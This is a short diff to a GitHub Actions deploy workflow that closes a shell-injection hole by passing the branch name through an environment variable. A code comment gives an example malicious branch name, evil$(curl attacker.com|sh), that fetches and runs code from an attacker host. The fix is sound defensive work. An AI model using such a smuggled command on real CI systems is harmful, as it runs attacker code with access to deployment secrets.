@@ -47,4 +47,9 @@ jobs:
         env:
           CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
           CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
-        run: npx -y wrangler@4 pages deploy docs/out --project-name=librefang-docs --branch="${{ github.head_ref || github.ref_name }}"
+          # Pass the branch name through an env var so a malicious
+          # ref (e.g. evil$(curl attacker.com|sh)) cannot break out of
+          # the run-block via shell expansion.  See deploy-web.yml for
+          # the same fix; #3938 missed both deploy workflows.
+          HEAD_REF: ${{ github.head_ref || github.ref_name }}
+        run: npx -y wrangler@4 pages deploy docs/out --project-name=librefang-docs --branch="$HEAD_REF"
